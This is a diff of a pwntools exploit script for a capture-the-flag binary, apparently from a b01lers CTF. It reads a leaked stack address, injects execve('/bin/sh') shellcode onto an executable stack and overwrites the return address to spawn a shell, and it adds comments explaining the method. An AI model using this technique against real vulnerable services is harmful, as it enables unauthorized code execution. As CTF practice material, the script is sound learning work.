@@ -11,19 +11,20 @@ p = gdb.debug('./chal', '''
 
 # p = remote('where.harkonnen.b01lersc.tf', 8443, ssl=True)
 
-p.recvuntil('Quincy says somewhere around here might be fun... ')
-current_rsp_value = int(p.recvline().strip().decode(), 16)-0x8
-log.info(f'current rsp value: {hex(current_rsp_value)}')
+# NX is disabled, which means that shellcode on stack is executable
+# as current rsp value is known, write execve syscall shellcode and "/bin/sh" string directly to stack and overwrite return address with shellcode address to trigger system('/bin/sh\x00')
 
+p.recvuntil("Quincy says somewhere around here might be fun... ")
+current_rsp_val = int(p.recvline().strip(), 16)-0x8
+log.info(f"current rsp value: {hex(current_rsp_val)}")
 shellcode = asm(f'''
-    mov rdi, {current_rsp_value+0x30}
+    mov rdi, {current_rsp_val+0x30}
     xor rsi, rsi
     xor rdx, rdx 
     mov rax, 0x3b
     syscall
-''', arch='amd64')
-
-payload = shellcode+b'A'*7+b'/bin/sh\x00'+p64(current_rsp_value+0x10)
+''')
+payload = shellcode+b'A'*7+b'/bin/sh\x00'+p64(current_rsp_val+0x10)
 p.sendline(payload)
 
 p.interactive()
